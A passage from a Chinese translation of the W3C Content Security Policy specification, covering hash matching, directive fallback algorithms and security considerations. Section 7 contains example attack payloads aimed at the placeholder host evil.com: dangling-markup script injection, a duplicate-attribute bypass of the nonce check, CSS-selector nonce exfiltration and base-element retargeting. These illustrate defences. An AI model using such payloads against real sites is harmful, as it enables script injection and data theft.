                            id="ref-for-list-iterate③⑧">对于每个</a> <var>expression</var>（在 <var>list</var> 中）：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>expression</var> 与 <a data-link-type="grammar" href="#grammardef-keyword-source"
                                    id="ref-for-grammardef-keyword-source⑤"><code>keyword-source</code></a> "<a
                                    data-link-type="grammar" href="#grammardef-unsafe-hashes"
                                    id="ref-for-grammardef-unsafe-hashes"><code>'unsafe-hashes'</code></a>" 在 <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive②⓪">ASCII 大小写不敏感</a> 匹配中匹配，设 <var>unsafe-hashes
                                    flag</var> 为 <code>true</code>。跳出循环。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>type</var> 是 "<code>script</code>" 或 "<code>style</code>"，或 <var>unsafe-hashes flag</var>
                        为 <code>true</code>：</p>
                    <ol>
                        <li data-md>
                            <p>将 <var>source</var> 设置为执行 <a data-link-type="dfn"
                                    href="https://encoding.spec.whatwg.org/#utf-8-encode"
                                    id="ref-for-utf-8-encode">UTF-8 编码</a> 的结果，该编码是对执行 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#javascript-string-convert"
                                    id="ref-for-javascript-string-convert">JavaScript 字符串转换</a>的 <var>source</var> 进行的。
                            </p>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate③⑨">对于每个</a> <var>expression</var>（在 <var>list</var> 中）：</p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar"
                                            href="#grammardef-hash-source"
                                            id="ref-for-grammardef-hash-source⑦"><code>hash-source</code></a> 语法：</p>
                                    <ol>
                                        <li data-md>
                                            <p>设 <var>algorithm</var> 为 null。</p>
                                        <li data-md>
                                            <p>如果 <var>expression</var> 的 <a data-link-type="grammar"
                                                    href="#grammardef-hash-algorithm"
                                                    id="ref-for-grammardef-hash-algorithm③"><code>hash-algorithm</code></a>
                                                部分与 "sha256" 在 <a data-link-type="dfn"
                                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                                    id="ref-for-ascii-case-insensitive②①">ASCII 大小写不敏感</a> 匹配中匹配，设
                                                <var>algorithm</var> 为 <a data-link-type="dfn"
                                                    href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"
                                                    id="ref-for-something①">SHA-256</a>。
                                            </p>
                                        <li data-md>
                                            <p>如果 <var>expression</var> 的 <a data-link-type="grammar"
                                                    href="#grammardef-hash-algorithm"
                                                    id="ref-for-grammardef-hash-algorithm④"><code>hash-algorithm</code></a>
                                                部分与 "sha384" 在 <a data-link-type="dfn"
                                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                                    id="ref-for-ascii-case-insensitive②②">ASCII 大小写不敏感</a> 匹配中匹配，设
                                                <var>algorithm</var> 为 <a data-link-type="dfn"
                                                    href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"
                                                    id="ref-for-something②">SHA-384</a>。
                                            </p>
                                        <li data-md>
                                            <p>如果 <var>expression</var> 的 <a data-link-type="grammar"
                                                    href="#grammardef-hash-algorithm"
                                                    id="ref-for-grammardef-hash-algorithm⑤"><code>hash-algorithm</code></a>
                                                部分与 "sha512" 在 <a data-link-type="dfn"
                                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                                    id="ref-for-ascii-case-insensitive②③">ASCII 大小写不敏感</a> 匹配中匹配，设
                                                <var>algorithm</var> 为 <a data-link-type="dfn"
                                                    href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"
                                                    id="ref-for-something③">SHA-512</a>。
                                            </p>
                                        <li data-md>
                                            <p>如果 <var>algorithm</var> 不为 null：</p>
                                            <ol>
                                                <li data-md>
                                                    <p>设 <var>actual</var> 为应用 <var>algorithm</var> 于 <var>source</var>
                                                        的结果，并对该结果进行 <a data-link-type="dfn"
                                                            href="https://tools.ietf.org/html/rfc4648#section-4"
                                                            id="ref-for-section-4①">base64 编码</a>。</p>
                                                <li data-md>
                                                    <p>设 <var>expected</var> 为 <var>expression</var> 的 <a
                                                            data-link-type="grammar" href="#grammardef-base64-value"
                                                            id="ref-for-grammardef-base64-value⑦"><code>base64-value</code></a>
                                                        部分，将所有 '<code>-</code>' 字符替换为 '<code>+</code>'，并将所有
                                                        '<code>_</code>' 字符替换为 '<code>/</code>'。</p>
                                                    <p class="note" role="note"><span class="marker">注意：</span> 这种替换将 <a
                                                            data-link-type="dfn"
                                                            href="https://tools.ietf.org/html/rfc4648#section-5"
                                                            id="ref-for-section-5①">base64url 编码</a> 表达的哈希值标准化为 <a
                                                            data-link-type="dfn"
                                                            href="https://tools.ietf.org/html/rfc4648#section-4"
                                                            id="ref-for-section-4②">base64 编码</a> 以进行匹配。
                                                    </p>
                                                <li data-md>
                                                    <p>如果 <var>actual</var> 与 <var>expected</var> <a
                                                            data-link-type="dfn"
                                                            href="https://infra.spec.whatwg.org/#string-is"
                                                            id="ref-for-string-is③">相同</a>，返回 "<code>Matches</code>"。
                                                    </p>
                                            </ol>
                                    </ol>
                            </ol>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span> 哈希适用于内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑨">script</a></code>
                        和内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element②">style</a></code>。如果源表达式
                        "<a data-link-type="grammar" href="#grammardef-unsafe-hashes"
                            id="ref-for-grammardef-unsafe-hashes①"><code>'unsafe-hashes'</code></a>"
                        存在，它们也适用于事件处理程序、style 属性和 <code>javascript:</code> 导航。
                    </p>
            </ol>
            <p class="issue" id="issue-fde03f65"><a class="self-link" href="#issue-fde03f65"></a> 应该处理
                <code>'strict-dynamic'</code> 以动态插入内联脚本。<a href="https://github.com/w3c/webappsec-csp/issues/426">[Issue
                    #w3c/webappsec-csp#426]</a>
            </p>
            <ol start="6">
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h3 class="heading settled" data-level="6.8" id="directive-algorithms"><span class="secno">6.8. </span><span
                    class="content">指令算法</span><a class="self-link" href="#directive-algorithms"></a>
            </h3>
            <h4 class="heading settled algorithm" data-algorithm="Get the effective directive for request"
                data-level="6.8.1" id="effective-directive-for-a-request"><span class="secno">6.8.1. </span><span
                    class="content"> 获取 <var>request</var> 的有效指令 </span><a class="self-link"
                    href="#effective-directive-for-a-request"></a></h4>
            <p>每个 <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives③">fetch 指令</a>
                控制 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑥①">request</a>
                的特定目标。给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑥②">请求</a> <var>request</var>，以下算法返回请求的 <a data-link-type="dfn"
                    href="#directive-name" id="ref-for-directive-name①⑧">名称</a>
                或 null，作为 <dfn class="dfn-paneled" data-dfn-for="request" data-dfn-type="dfn" data-export
                    id="request-effective-directive">有效指令</dfn>：
            </p>
            <ol>
                <li data-md>
                    <p>如果 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-initiator"
                            id="ref-for-concept-request-initiator②">initiator</a> 是 "<code>prefetch</code>" 或
                        "<code>prerender</code>"，返回 <code>default-src</code>。</p>
                <li data-md>
                    <p>根据 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination⑥">destination</a>，执行相应步骤：</p>
                    <dl>
                        <dt data-md>空字符串
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>connect-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>manifest</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>manifest-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>object</code>"
                        <dt data-md>"<code>embed</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>object-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>frame</code>"
                        <dt data-md>"<code>iframe</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>frame-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>audio</code>"
                        <dt data-md>"<code>track</code>"
                        <dt data-md>"<code>video</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>media-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>font</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>font-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>image</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>img-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>style</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>style-src-elem</code>。</p>
                            </ol>
                        <dt data-md>"<code>script</code>"
                        <dt data-md>"<code>xslt</code>"
                        <dt data-md>"<code>audioworklet</code>"
                        <dt data-md>"<code>paintworklet</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>script-src-elem</code>。</p>
                            </ol>
                        <dt data-md>"<code>serviceworker</code>"
                        <dt data-md>"<code>sharedworker</code>"
                        <dt data-md>"<code>worker</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>worker-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>json</code>"
                        <dt data-md>"<code>webidentity</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>connect-src</code>。</p>
                            </ol>
                        <dt data-md>"<code>report</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 null。</p>
                            </ol>
                    </dl>
                <li data-md>
                    <p>返回 <code>connect-src</code>。</p>
            </ol>
            <p class="note" role="note"><span class="marker">注意：</span> 该算法返回 <code>connect-src</code> 作为默认回退。这是为了处理新添加的
                fetch 目标，这些目标不明确归入其他类别中。</p>
            <h4 class="heading settled algorithm" data-algorithm="获取用于内联检查的有效指令" data-level="6.8.2"
                id="effective-directive-for-inline-check"><span class="secno">6.8.2. </span><span class="content">
                    获取用于内联检查的有效指令 </span><a class="self-link" href="#effective-directive-for-inline-check"></a></h4>
            <p>给定一个字符串 <var>type</var>，此算法返回有效指令的 <a data-link-type="dfn" href="#directive-name"
                    id="ref-for-directive-name①⑨">名称</a>。</p>
            <p class="note" role="note"><span class="marker">注意：</span> 虽然 <a data-link-type="dfn"
                    href="#request-effective-directive" id="ref-for-request-effective-directive">有效指令</a>
                仅为 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑥③">请求</a> 定义，但在本算法中，它用于表示与特定类型内联检查最相关的指令。</p>
            <ol>
                <li data-md>
                    <p>根据 <var>type</var> 进行判断：</p>
                    <dl>
                        <dt data-md>"<code>script</code>"
                        <dt data-md>"<code>navigation</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>script-src-elem</code>。</p>
                            </ol>
                        <dt data-md>"<code>script attribute</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>script-src-attr</code>。</p>
                            </ol>
                        <dt data-md>"<code>style</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>style-src-elem</code>。</p>
                            </ol>
                        <dt data-md>"<code>style attribute</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>style-src-attr</code>。</p>
                            </ol>
                    </dl>
                <li data-md>
                    <p>返回 null。</p>
            </ol>
            <h4 class="heading settled algorithm" data-algorithm="获取提取指令的回退列表" data-level="6.8.3"
                id="directive-fallback-list"><span class="secno">6.8.3. </span><span class="content"> 获取提取指令的回退列表
                </span><a class="self-link" href="#directive-fallback-list"></a></h4>
            <p>将返回特定 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set"
                    id="ref-for-ordered-set④">有序集合</a> 中的回退 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives③⑤">指令</a>。
                返回的 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set"
                    id="ref-for-ordered-set⑤">有序集合</a> 按最相关到最不相关的顺序排序，
                并包含有效指令本身。</p>
            <p>给定一个字符串 <var>directive name</var>：</p>
            <ol>
                <li data-md>
                    <p>根据 <var>directive name</var> 进行判断：</p>
                    <dl>
                        <dt data-md>"<code>script-src-elem</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "script-src-elem", "script-src", "default-src" >></code>。
                                    </p>
                            </ol>
                        <dt data-md>"<code>script-src-attr</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "script-src-attr", "script-src", "default-src" >></code>。
                                    </p>
                            </ol>
                        <dt data-md>"<code>style-src-elem</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "style-src-elem", "style-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>style-src-attr</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "style-src-attr", "style-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>worker-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回
                                        <code>&lt;&lt; "worker-src", "child-src", "script-src", "default-src" >></code>。
                                    </p>
                            </ol>
                        <dt data-md>"<code>connect-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "connect-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>manifest-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "manifest-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>object-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "object-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>frame-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "frame-src", "child-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>media-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "media-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>font-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "font-src", "default-src" >></code>。</p>
                            </ol>
                        <dt data-md>"<code>img-src</code>"
                        <dd data-md>
                            <ol>
                                <li data-md>
                                    <p>返回 <code>&lt;&lt; "img-src", "default-src" >></code>。</p>
                            </ol>
                    </dl>
                <li data-md>
                    <p>返回 <code>&lt;&lt; >></code>。</p>
            </ol>
            <h4 class="heading settled algorithm" data-algorithm="判断是否应执行提取指令" data-level="6.8.4"
                id="should-directive-execute"><span class="secno">6.8.4. </span><span class="content"> 判断是否应执行提取指令
                </span><a class="self-link" href="#should-directive-execute"></a></h4>
            <p>该算法用于<a data-link-type="dfn" href="#fetch-directives"
                    id="ref-for-fetch-directives④">提取指令</a>，用于决定指令是否应该执行或推迟到更适合的其他指令。
                例如：如果 <var>有效指令名称</var> 是 <code>worker-src</code>（意味着我们正在检查一个 worker 请求），
                那么如果存在 <code>worker-src</code> 或 <code>script-src</code> 指令，则不应执行 <code>default-src</code> 指令。</p>
            <p>给定一个字符串 <var>有效指令名称</var>，一个字符串 <var>指令名称</var>，以及一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦③">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>指令回退列表</var> 为在 <var>有效指令名称</var> 上执行 <a href="#directive-fallback-list">§ 6.8.3
                            获取提取指令回退列表</a> 的结果。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate④⓪">对于每个</a> <var>回退指令</var> 在 <var>指令回退列表</var> 中：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>指令名称</var> 是 <var>回退指令</var>，返回 "<code>是</code>"。</p>
                        <li data-md>
                            <p>如果 <var>policy</var> 包含名称为 <var>回退指令</var> 的指令，返回 "<code>否</code>"。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>否</code>"。</p>
            </ol>
        </section>
        <section>
            <h2 class="heading settled" data-level="7" id="security-considerations"><span class="secno">7. </span><span
                    class="content">安全和隐私注意事项</span><a class="self-link" href="#security-considerations"></a>
            </h2>
            <h3 class="heading settled" data-level="7.1" id="security-nonces"><span class="secno">7.1. </span><span
                    class="content">Nonce 重用</span><a class="self-link" href="#security-nonces"></a></h3>
            <p>Nonce 会覆盖它们所传递的指令中的其他限制。因此，保持它们不可猜测是至关重要的，否则绕过资源的策略就变得非常简单。</p>
            <p>如果服务器在 <a data-link-type="grammar" href="#grammardef-nonce-source"
                    id="ref-for-grammardef-nonce-source⑧">nonce-source</a> 表达式中作为 <a data-link-type="dfn"
                    href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑦④">策略</a>的一部分传递，服务器必须每次传递策略时生成一个唯一值。生成的值应至少有 128
                位长（编码之前），并且应通过密码学安全的随机数生成器生成，以确保该值对攻击者难以预测。</p>
            <p class="note" role="note"><span class="marker">注意：</span> 使用 nonce 允许内联脚本或样式的安全性不如不使用 nonce，因为 nonce
                会覆盖它们所在指令中的限制。攻击者一旦能获取 nonce，就可以随时执行任意脚本。不过，当在旧代码之上叠加内容安全策略时，nonce 提供了比 <a data-link-type="grammar"
                    href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline③">'unsafe-inline'</a>
                更大的安全提升。在考虑使用 <a data-link-type="grammar" href="#grammardef-unsafe-inline"
                    id="ref-for-grammardef-unsafe-inline④">'unsafe-inline'</a> 时，建议作者考虑使用 nonce（或哈希）替代。</p>
            <h3 class="heading settled" data-level="7.2" id="security-nonce-hijacking"><span class="secno">7.2.
                </span><span class="content">Nonce 劫持</span><a class="self-link" href="#security-nonce-hijacking"></a>
            </h3>
            <h4 class="heading settled" data-level="7.2.1" id="dangling-markup-attacks"><span class="secno">7.2.1.
                </span><span class="content">悬空标记攻击</span><a class="self-link" href="#dangling-markup-attacks"></a></h4>
            <p>悬空标记攻击，例如在 <a data-link-type="biblio" href="#biblio-filedescriptor-2015"
                    title="CSP 2015">[FILEDESCRIPTOR-2015]</a> 中讨论的攻击，可以用于重新利用页面的合法 nonce 进行注入。例如，假设一个注入点位于某个
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⓪">script</a></code>
                元素之前：
            </p>
            <pre class="highlight"><c- p>&lt;</c-><c- f>p</c-><c- p>></c->Hello, [注入点]<c- p>&lt;/</c-><c- f>p</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <p>如果攻击者注入字符串 "<code>&lt;script src='https://evil.com/evil.js' </code>"，则浏览器会收到以下内容：</p>
            <pre class="highlight"><c- p>&lt;</c-><c- f>p</c-><c- p>></c->Hello, <c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>'https://evil.com/evil.js'</c-> &lt;/<c- e>p</c-><c- p>></c->
<c- o>&lt;</c->script nonce<c- o>=</c->abc src<c- o>=</c->/good.js><c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <p>然后它将解析该代码，得到一个具有指向恶意载荷的 <code>src</code> 属性的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①①">script</a></code>
                元素，包含一个名为
                <code>&lt;/p></code> 的属性，一个名为 "<code>&lt;script</code>" 的属性，一个 <code>nonce</code> 属性，以及被解析器丢弃为重复项的第二个
                <code>src</code> 属性。
            </p>
            <p><a href="#is-element-nonceable">§ 6.7.3.1 是否元素可以应用 nonce？</a> 算法尝试通过遍历
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①②">script</a></code>
                或
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element③">style</a></code>
                元素属性，查找属性名或值中是否包含字符串 "<code>&lt;script</code>" 或 "<code>&lt;style</code>" 来减轻这种特定攻击。
            </p>
            <p>在实现此算法时，用户代理必须特别注意不要忽略重复的属性。如果元素具有重复的属性，则该属性的所有实例在第一个之后都会被忽略，但在 <a href="#is-element-nonceable">§ 6.7.3.1
                    是否元素可以应用 nonce？</a> 算法中，所有属性（包括重复的属性）都需要进行检查。</p>
            <p class="issue" id="issue-74cb0fbd"><a class="self-link" href="#issue-74cb0fbd"></a> 目前 HTML 规范的解析算法在运行 <a
                    href="#is-element-nonceable">§ 6.7.3.1 是否元素可以应用 nonce？</a> 算法之前就移除了这些信息，因此实际上不可能检测到重复的属性。<a
                    href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a></p>
            <p>对于以下示例页面：</p>
            <pre class="highlight">Hello, [注入点]
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <p>以下注入的字符串将使用重复属性来尝试绕过 <a href="#is-element-nonceable">§ 6.7.3.1 是否元素可以应用 nonce？</a> 算法检查：</p>
            <pre class="highlight">Hello, <c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>'https://evil.com/evil.js'</c-> <c- e>x</c-><c- o>=</c-><c- s>""</c-> <c- e>x</c-><c- o>=</c->
<c- s>&lt;script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>"abcd"</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <h4 class="heading settled" data-level="7.2.2" id="nonce-exfiltration-content-attributes"><span
                    class="secno">7.2.2. </span><span class="content">通过内容属性的 Nonce 泄露</span><a class="self-link"
                    href="#nonce-exfiltration-content-attributes"></a></h4>
            <p>某些对 CSP 的攻击依赖于通过各种可以读取内容属性的机制来泄露 nonce 数据。CSS 选择器是最好的例子：通过巧妙地使用前缀/后缀文本匹配选择器的值，可以将 nonce
                数据发送到攻击者的服务器以便重用。例如：</p>
            <pre class="highlight">script<c- p>[</c->nonce=a<c- p>]</c-> <c- p>{</c-> <c- k>background</c-><c- p>:</c-> <c- nf>url</c-><c- p>(</c-><c- s>"https://evil.com/nonce?a"</c-><c- p>);}</c->
</pre>
            <p>
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce①">nonce</a></code>
                部分讨论了通过隐藏元素的内容属性中的 nonce，并将其移动到内部插槽来减轻这些类型的攻击。这是为了确保 <code>nonce</code> 值仅暴露给脚本，而不暴露给任何其他非脚本渠道。
            </p>
            <h3 class="heading settled" data-level="7.3" id="security-nonce-retargeting"><span class="secno">7.3.
                </span><span class="content">Nonce 重定向</span><a class="self-link"
                    href="#security-nonce-retargeting"></a></h3>
            <p>Nonce 会绕过 <a data-link-type="grammar" href="#grammardef-host-source"
                    id="ref-for-grammardef-host-source⑤">host-source</a>
                表达式，允许开发者从任意来源加载代码。这通常对开发者而言是可以接受的，也是理想的。但是，如果攻击者能够注入一个
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element③">base</a></code>
                元素，那么在解析相对 URL 时，原本安全的页面可能会被劫持。也就是说，在 <code>https://example.com/</code> 上，以下代码将加载
                <code>https://example.com/good.js</code>：
            </p>
            <pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <p>然而，以下代码将加载 <code>https://evil.com/good.js</code>：</p>
            <pre class="highlight"><c- p>&lt;</c-><c- f>base</c-> <c- e>href</c-><c- o>=</c-><c- s>"https://evil.com"</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            <p>为了降低这种风险，建议在每个页面上设置明确的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element④">base</a></code>
                元素，或通过在页面策略中设置 <a data-link-type="dfn" href="#base-uri" id="ref-for-base-uri①"><code>base-uri</code></a>
                指令来限制攻击者注入自己的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element⑤">base</a></code>
                元素的能力。例如，<code>base-uri 'none'</code>。
            </p>
            <h3 class="heading settled" data-level="7.4" id="security-css-parsing"><span class="secno">7.4. </span><span
                    class="content">CSS 解析</span><a class="self-link" href="#security-css-parsing"></a></h3>
            <p><a data-link-type="dfn" href="#style-src" id="ref-for-style-src">style-src</a>
                指令限制了受保护资源可以从哪些位置加载样式。然而，如果用户代理使用宽松的 CSS 解析算法，攻击者可能会诱骗用户代理接受来自原本可信来源的恶意“样式表”。</p>
            <p>这些攻击类似于 Chris Evans 在 2009 年描述的跨源数据泄露攻击 <a data-link-type="biblio" href="#biblio-css-abuse"
                    title="Generic cross-browser cross-domain theft">[CSS-ABUSE]</a>。用户代理应使用相同的机制抵御这两种攻击：对 MIME
                类型不正确的样式表使用更严格的 CSS 解析规则。</p>
            <h3 class="heading settled" data-level="7.5" id="security-violation-reports"><span class="secno">7.5.
                </span><span class="content">违规报告</span><a class="self-link" href="#security-violation-reports"></a>
            </h3>
            <p>本文件中的违规报告机制旨在降低恶意网站利用违规报告探查其他服务器行为的风险。例如，考虑一个恶意网站允许 <code>https://example.com</code> 作为图像来源。如果恶意网站尝试将
                <code>https://example.com/login</code> 作为图像加载，并且 <code>example.com</code> 服务器重定向到一个身份提供者（例如
                <code>identityprovider.example.net</code>），则 CSP 会阻止请求。如果违规报告包含完整的被阻止 URL，则违规报告可能包含重定向 URL
                中的敏感信息，例如会话标识符或声称的身份。因此，用户代理仅包含原始请求的 URL，而不包含重定向目标。
            </p>
            <p>还需注意，违规报告应视为攻击者控制的数据。希望在仪表板或类似服务中收集违规报告的开发人员应小心在渲染报告之前正确转义其内容（他们可能自己也应该使用 CSP 进一步降低注入风险）。特别是违规报告的
                "<code>script-sample</code>" 属性和
                <code
                    class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample②">sample</a></code>
                属性，这两者都是完全由攻击者控制的字符串。
            </p>
            <h3 class="heading settled" data-level="7.6" id="source-list-paths-and-redirects"><span class="secno">7.6.
                </span><span class="content">路径与重定向</span><a class="self-link"
                    href="#source-list-paths-and-redirects"></a></h3>
            <p>为了避免跨源泄露路径信息（如 Egor Homakov 在其文章 <a
                    href="https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html">使用内容安全策略作恶</a>
                中讨论的），匹配算法会在加载资源是重定向的结果时忽略源表达式的路径部分。例如，假设一个页面的策略为
                <code><a data-link-type="dfn" href="#img-src" id="ref-for-img-src③">img-src</a> example.com example.org/path</code>：
            </p>
            <ul>
                <li data-md>
                    <p>直接加载 <code>https://example.org/not-path</code> 会失败，因为它不匹配策略。</p>
                <li data-md>
                    <p>直接加载 <code>https://example.com/redirector</code> 会成功，因为它匹配 <code>example.com</code>。</p>
                <li data-md>
                    <p>假设 <code>https://example.com/redirector</code> 返回指向 <code>https://example.org/not-path</code>
                        的重定向响应，则加载会成功，因为初始 URL 匹配 <code>example.com</code>，且重定向目标在忽略路径部分时匹配
                        <code>example.org/path</code>。
                    </p>
            </ul>
            <p>当重定向存在时，这种限制会降低文档策略的粒度，但这是为了避免此类信息泄露被暴力破解所做的必要妥协。</p>
            <p>在 public-webappsec@w3.org 上有较长的讨论线程 <a
                    href="https://lists.w3.org/Archives/Public/public-webappsec/2014Feb/0036.html">“移除 CSP
                    中的路径？”</a>，详细讨论了其他替代提案。</p>
            <h3 class="heading settled" data-level="7.7" id="security-secure-upgrades"><span class="secno">7.7.
                </span><span class="content">安全升级</span><a class="self-link" href="#security-secure-upgrades"></a></h3>
            <p>为了减轻历史扫描攻击的某种变体，如 Yan Zhu 的 <a href="http://diracdeltas.github.io/sniffly/">Sniffly</a>，CSP 不允许页面通过类似
                <code>script-src http://example.com</code> 的策略将自己锁定到不安全的 URL 中。如 <a href="#match-schemes">§ 6.7.2.9
                    scheme-part matching</a> 中所述，源表达式的方案部分将始终允许升级到安全版本。
            </p>
            <h3 class="heading settled" data-level="7.8" id="security-inherit-csp"><span class="secno">7.8. </span><span
